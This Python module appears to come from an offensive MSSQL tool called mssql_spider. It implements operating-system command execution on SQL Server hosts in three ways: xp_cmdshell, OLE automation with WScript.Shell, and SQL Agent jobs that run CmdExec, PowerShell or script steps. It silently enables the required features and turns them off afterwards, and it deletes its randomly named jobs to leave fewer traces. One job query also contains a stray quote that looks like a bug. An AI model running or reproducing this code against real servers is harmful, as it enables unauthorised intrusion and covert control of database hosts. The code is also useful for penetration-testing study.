from typing import Any
import random
import string

from mssql_spider.client import MSSQLClient


def cmdshell(client: MSSQLClient, command: str) -> dict[str, Any]:
    lines = xp_cmdshell(client, command)
    if len(lines) == 0:
        return dict()
    elif len(lines) == 1:
        return dict(output=lines[0].rstrip())
    else:
        return dict(output='\n' + '\n'.join(lines))


def xp_cmdshell(client: MSSQLClient, command: str) -> list[str]:
    enabled = xp_cmdshell_enabled(client)
    if not enabled:
        enable_xp_cmdshell(client)
    rows = client.query(f'EXEC master.dbo.xp_cmdshell {client.escape_string(command)}')
    if not enabled:
        disable_xp_cmdshell(client)
    lines = [row['output'] for row in rows if row['output'] != 'NULL']
    return lines


def xp_cmdshell_enabled(client: MSSQLClient) -> bool:
    rows = client.query("SELECT convert(int, isnull(value, value_in_use)) AS [value] FROM sys.configurations WHERE name='xp_cmdshell'");
    assert len(rows) == 1
    return bool(rows[0]['value'])


def enable_xp_cmdshell(client: MSSQLClient) -> None:
    client.configure('show advanced options', True)
    client.configure('xp_cmdshell', True)


def disable_xp_cmdshell(client: MSSQLClient) -> None:
    client.configure('xp_cmdshell', False)
    client.configure('show advanced options', False)


def ole(client: MSSQLClient, command: str) -> dict[str, Any]:
    # FIXME figure out proper escaping rules here
    assert '"' not in command, 'double quotes not supported'
    command = f'Run("{command}")'

    enabled = ole_automation_enabled(client)
    if not enabled:
        enable_ole_automation(client)
    try:
        client.query((
            'DECLARE @output int '
            'DECLARE @program varchar(255) '
            f'SET @program={client.escape_string(command)} '
            f"EXEC master.dbo.sp_oacreate 'WScript.Shell', @output out "
            f'EXEC master.dbo.sp_oamethod @output, @program '
            f'EXEC master.dbo.sp_oadestroy @output'
        ))
    finally:
        if not enabled:
            disable_ole_automation(client)
    return {}


def enable_ole_automation(client: MSSQLClient) -> None:
    client.configure('show advanced options', True)
    client.configure('Ole Automation Procedures', True)


def disable_ole_automation(client: MSSQLClient) -> None:
    client.configure('Ole Automation Procedures', False)
    client.configure('show advanced options', False)


def ole_automation_enabled(client: MSSQLClient) -> bool:
    rows = client.query("SELECT convert(int, isnull(value, value_in_use)) AS [value] FROM sys.configurations WHERE name='Ole Automation Procedures'");
    assert len(rows) == 1
    return bool(rows[0]['value'])


def job(client: MSSQLClient, language: str, command: str) -> dict[str, Any]:
    subsystems = dict(
        sql='TSQL',
        cmd='CmdExec',
        powershell='PowerShell',
        jscript='ActiveScripting',
        vbscript='ActiveScripting',
    )
    try:
        subsystem = client.escape_string(subsystems[language])
    except KeyError as e:
        raise ValueError('invalid language') from e
    command = client.escape_string(command)
    job_name, step_name = client.escape_string(random_string()), client.escape_string(random_string())

    enabled = sql_server_agent_enabled(client)
    if not enabled:
        enable_sql_server_agent(client)
    try:
        client.query_database(
            'msdb',
            'BEGIN TRY '
            f"EXEC dbo.sp_add_job {job_name} "
            f"EXEC dbo.sp_add_jobstep @job_name={job_name}',@step_name={step_name},@subsystem={subsystem},@command={command} "
            f"EXEC dbo.sp_add_jobserver @job_name={job_name} "
            f"EXEC dbo.sp_start_job {job_name} "
            "WAITFOR DELAY '00:00:05' "
            'END TRY '
            'BEGIN CATCH '
            'END CATCH '
            f"EXEC dbo.sp_delete_job {job_name}"
        )
    finally:
        if not enabled:
            disable_sql_server_agent(client)
    return {}


def random_string(length: int = 8) -> str:
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def sql_server_agent_enabled(client: MSSQLClient) -> bool:
    rows = client.query("EXEC master.dbo.xp_servicecontrol 'Querystate','SQLServerAgent'")
    assert len(rows) == 1 and len(rows[0]) == 1
    return rows[0]['Current Service State'].lower().removesuffix('.') == 'started'


def enable_sql_server_agent(client: MSSQLClient) -> None:
    client.query("EXEC master.dbo.xp_servicecontrol 'Start','SQLServerAgent'")


def disable_sql_server_agent(client: MSSQLClient) -> None:
    client.query("EXEC master.dbo.xp_servicecontrol 'Stop','SQLServerAgent'")
